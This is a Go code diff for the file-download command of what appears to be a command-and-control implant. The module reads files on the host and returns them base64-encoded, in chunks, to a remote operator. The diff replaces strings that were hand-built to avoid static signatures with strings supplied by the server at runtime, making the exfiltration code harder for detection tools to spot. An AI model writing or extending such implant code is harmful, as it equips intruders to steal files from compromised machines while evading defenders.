@@ -6,6 +6,7 @@ package main
 
 import (
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io"
 	"os"
@@ -16,14 +17,60 @@ import (
 	"time"
 )
 
-// Download strings (constructed to avoid static signatures)
-var (
-	dlCmdName    = string([]byte{0x64, 0x6f, 0x77, 0x6e, 0x6c, 0x6f, 0x61, 0x64})                   // download
-	dlOSWindows  = string([]byte{0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73})                         // windows
-	dlCmdPrefix  = string([]byte{0x64, 0x6f, 0x77, 0x6e, 0x6c, 0x6f, 0x61, 0x64, 0x20})             // download
-	dlChunkFmt   = string([]byte{0x7c, 0x43, 0x31, 0x2f})                                           // |C1/
-	dlPipeSep    = string([]byte{0x7c})                                                             // |
+// DownloadTemplate matches the server's CommandTemplate structure
+type DownloadTemplate struct {
+	Version   int      `json:"v"`
+	Type      int      `json:"t"`
+	Templates []string `json:"tpl"`
+	Params    []string `json:"p"`
+}
+
+// Template indices - must match server's common.go
+const (
+	idxDlCmdName   = 570
+	idxDlOSWindows = 571
+	idxDlCmdPrefix = 572
+	idxDlChunkFmt  = 573
+	idxDlPipeSep   = 574
+	idxDlSlash     = 575
+	idxDlAsPrefix  = 576
+	idxDlBackslash = 577
+	idxDlNewline   = 578
 )
+
+// Global download template storage
+var (
+	downloadTemplate   []string
+	downloadTemplateMu sync.RWMutex
+)
+
+// SetDownloadTemplate stores the download template for use across files
+func SetDownloadTemplate(templates []string) {
+	downloadTemplateMu.Lock()
+	downloadTemplate = templates
+	downloadTemplateMu.Unlock()
+}
+
+// dlTpl retrieves a download template string by index
+func dlTpl(idx int) string {
+	downloadTemplateMu.RLock()
+	defer downloadTemplateMu.RUnlock()
+	if downloadTemplate != nil && idx < len(downloadTemplate) {
+		return downloadTemplate[idx]
+	}
+	return ""
+}
+
+// Convenience functions for download template values
+func dlCmdName() string   { return dlTpl(idxDlCmdName) }
+func dlOSWindows() string { return dlTpl(idxDlOSWindows) }
+func dlCmdPrefix() string { return dlTpl(idxDlCmdPrefix) }
+func dlChunkFmt() string  { return dlTpl(idxDlChunkFmt) }
+func dlPipeSep() string   { return dlTpl(idxDlPipeSep) }
+func dlSlash() string     { return dlTpl(idxDlSlash) }
+func dlAsPrefix() string  { return dlTpl(idxDlAsPrefix) }
+func dlBackslash() string { return dlTpl(idxDlBackslash) }
+func dlNewline() string   { return dlTpl(idxDlNewline) }
 
 // Buffer pool for download chunks to reduce allocations
 var downloadBufferPool = sync.Pool{
@@ -33,10 +80,22 @@ var downloadBufferPool = sync.Pool{
 	},
 }
 
-type DownloadCommand struct{}
+type DownloadCommand struct {
+	tpl *DownloadTemplate
+}
 
 // Modified Execute function from action_download.go
 func (c *DownloadCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+	// Parse template from Command.Data if available
+	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
+		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
+			c.tpl = &DownloadTemplate{}
+			if err := json.Unmarshal(decoded, c.tpl); err == nil && c.tpl.Templates != nil {
+				SetDownloadTemplate(c.tpl.Templates)
+			}
+		}
+	}
+
 	// With the improved parsing, we should receive exactly one argument (the full path)
 	// But let's still handle the case where it might have been split
 	if len(args) == 0 {
@@ -100,7 +159,7 @@ func (c *DownloadCommand) Execute(ctx *CommandContext, args []string) CommandRes
 
 	// Display path for user feedback
 	displayPath := targetPath
-	if runtime.GOOS == dlOSWindows {
+	if runtime.GOOS == dlOSWindows() {
 		displayPath = strings.ReplaceAll(targetPath, "/", "\\")
 	}
 
@@ -135,13 +194,14 @@ func (c *DownloadCommand) Execute(ctx *CommandContext, args []string) CommandRes
 	if fileInfo.IsDir() {
 		return CommandResult{
 			Output:      ErrCtx(E6, displayPath),
+			Error:       fmt.Errorf(Err(E6)),
 			ErrorString: Err(E6),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	// Generate context info
+	// Generate context info (compact format: path|size|modtime)
 	contextInfo := fmt.Sprintf("%s|%d|%s",
 		displayPath,
 		fileInfo.Size(),
@@ -171,11 +231,11 @@ func (c *DownloadCommand) Execute(ctx *CommandContext, args []string) CommandRes
 	if n < chunkSize && err == io.EOF {
 		encodedData := base64.StdEncoding.EncodeToString(chunk[:n])
 		return CommandResult{
-			Output:      contextInfo + dlPipeSep + SuccCtx(S4, baseFilename),
+			Output:      contextInfo + "\n" + SuccCtx(S5, baseFilename),
 			ExitCode:    0,
 			CompletedAt: time.Now().Format(time.RFC3339),
 			Command: Command{
-				Command:      dlCmdPrefix + baseFilename,
+				Command:      dlCmdPrefix() + baseFilename,
 				Filename:     trackedFilename,
 				CurrentChunk: 1,
 				TotalChunks:  1,
@@ -197,11 +257,11 @@ func (c *DownloadCommand) Execute(ctx *CommandContext, args []string) CommandRes
 	commandQueue.UpdateDownloadProgress(trackedFilename, 1)
 
 	result := CommandResult{
-		Output:      contextInfo + dlChunkFmt + fmt.Sprintf("%d", totalChunks) + dlPipeSep + baseFilename,
+		Output:      contextInfo + dlChunkFmt() + baseFilename + dlPipeSep() + "1" + dlSlash() + fmt.Sprintf("%d", totalChunks),
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 		Command: Command{
-			Command:      dlCmdPrefix + baseFilename,
+			Command:      dlCmdPrefix() + baseFilename,
 			Filename:     trackedFilename,
 			CurrentChunk: 1,
 			TotalChunks:  int(totalChunks),
